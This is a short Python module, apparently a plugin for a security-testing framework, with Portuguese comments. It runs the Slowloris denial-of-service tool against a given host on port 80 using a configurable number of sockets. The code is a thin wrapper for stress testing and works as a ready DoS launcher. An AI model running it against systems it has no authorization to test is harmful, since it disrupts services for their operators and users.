from utils import run_cmd, extrair_host

def run(target: str, cfg: dict) -> str:
    """Executa teste de DoS com Slowloris."""
    host = extrair_host(target)
    sockets = str(cfg.get("sockets", 200))   # conexões simultâneas
    timeout = str(cfg.get("timeout", 10))    # intervalo entre pacotes

    cmd = ["slowloris", host, "-s", sockets, "-p", "80", "-timeout", timeout]

    return run_cmd(cmd, timeout=300)
